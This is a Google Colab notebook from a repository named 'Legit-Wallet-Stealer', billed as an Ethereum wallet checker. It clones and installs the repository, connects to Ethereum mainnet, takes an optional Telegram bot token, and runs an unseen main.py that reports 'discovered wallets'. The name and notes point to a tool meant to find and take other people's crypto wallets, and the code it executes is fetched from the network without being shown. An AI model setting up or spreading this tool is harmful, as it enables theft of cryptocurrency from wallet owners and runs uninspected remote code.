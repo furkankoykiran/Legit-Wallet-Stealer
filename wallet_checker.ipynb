{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 🌟 Ethereum Wallet Checker - Google Colab Edition\n",
    "\n",
    "Welcome to the Ethereum Wallet Checker! This notebook has been optimized for Google Colab environment with streamlined dependencies and cloud-based Ethereum connectivity.\n",
    "\n",
    "## 📋 Prerequisites\n",
    "\n",
    "All you need is:\n",
    "1. A Google account to run this Colab notebook\n",
    "2. (Optional) An Infura API key for Ethereum connectivity\n",
    "\n",
    "## 🚀 Getting Started\n",
    "\n",
    "Simply run each cell in order. The notebook will guide you through the setup process."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "source": [
    "# Check Python version and system info\n",
    "import sys\n",
    "print(f\"Python version: {sys.version}\\n\")\n",
    "\n",
    "# Clone the repository\n",
    "!git clone https://github.com/furkankoykiran/Legit-Wallet-Stealer\n",
    "%cd Legit-Wallet-Stealer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "source": [
    "# Install required packages\n",
    "!pip install web3==6.15.1 \\\n",
    "            python-dotenv==1.0.1 \\\n",
    "            requests==2.31.0 \\\n",
    "            eth-account==0.11.0 \\\n",
    "            colorama==0.4.6 \\\n",
    "            torch==2.2.0 \\\n",
    "            numpy==1.26.4 \\\n",
    "            psutil==5.9.8"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "source": [
    "# System Verification\n",
    "print(\"🔍 Checking system configuration...\\n\")\n",
    "\n",
    "# Verify CUDA availability\n",
    "print(\"🖥️ GPU Status:\")\n",
    "import torch\n",
    "\n",
    "if torch.cuda.is_available():\n",
    "    print(f\"✅ CUDA available\")\n",
    "    print(f\"📎 GPU: {torch.cuda.get_device_name(0)}\")\n",
    "else:\n",
    "    print(\"⚠️ CUDA not available - will use CPU instead\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "source": [
    "# Configure Ethereum Provider\n",
    "from web3 import Web3\n",
    "import os\n",
    "\n",
    "# You can use Infura (recommended) or other providers\n",
    "INFURA_PROJECT_ID = input(\"Enter your Infura Project ID (or press Enter to use a public node): \")\n",
    "\n",
    "if INFURA_PROJECT_ID:\n",
    "    w3 = Web3(Web3.HTTPProvider(f'https://mainnet.infura.io/v3/{INFURA_PROJECT_ID}'))\n",
    "else:\n",
    "    # Use a public node (not recommended for production)\n",
    "    w3 = Web3(Web3.HTTPProvider('https://cloudflare-eth.com'))\n",
    "\n",
    "print(\"\\n📡 Ethereum Node Status:\")\n",
    "if w3.is_connected():\n",
    "    print(f\"✅ Connected to Ethereum network\")\n",
    "    print(f\"📊 Current block: {w3.eth.block_number:,}\")\n",
    "else:\n",
    "    print(\"❌ Connection failed\")\n",
    "    print(\"⚠️ Please check your Infura Project ID or try again later\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "source": [
    "# Optional: Telegram Notifications\n",
    "print(\"📱 Configuring Telegram notifications (optional)...\")\n",
    "\n",
    "TELEGRAM_BOT_TOKEN = input(\"Enter your Telegram Bot Token (or press Enter to skip): \")\n",
    "if TELEGRAM_BOT_TOKEN:\n",
    "    TELEGRAM_CHAT_ID = input(\"Enter your Telegram Chat ID: \")\n",
    "    os.environ['TELEGRAM_BOT_TOKEN'] = TELEGRAM_BOT_TOKEN\n",
    "    os.environ['TELEGRAM_CHAT_ID'] = TELEGRAM_CHAT_ID\n",
    "    print(\"✅ Telegram notifications configured!\")\n",
    "else:\n",
    "    print(\"ℹ️ Skipping Telegram notifications\")\n",
    "\n",
    "# Set the Ethereum endpoint\n",
    "if INFURA_PROJECT_ID:\n",
    "    os.environ['ETH_ENDPOINT'] = f'https://mainnet.infura.io/v3/{INFURA_PROJECT_ID}'\n",
    "else:\n",
    "    os.environ['ETH_ENDPOINT'] = 'https://cloudflare-eth.com'\n",
    "\n",
    "print(\"\\n⚙️ Configuration complete!\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "source": [
    "# Launch Wallet Checker\n",
    "print(\"🚀 Launching Ethereum Wallet Checker...\\n\")\n",
    "!python main.py"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 📝 Notes\n",
    "\n",
    "- The wallet checker will continue running until manually stopped\n",
    "- Check the output for any discovered wallets\n",
    "- If enabled, notifications will be sent to your Telegram\n",
    "- For optimal performance, a GPU-enabled runtime is recommended\n",
    "\n",
    "For questions or support, please visit the [GitHub repository](https://github.com/furkankoykiran/Legit-Wallet-Stealer)."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}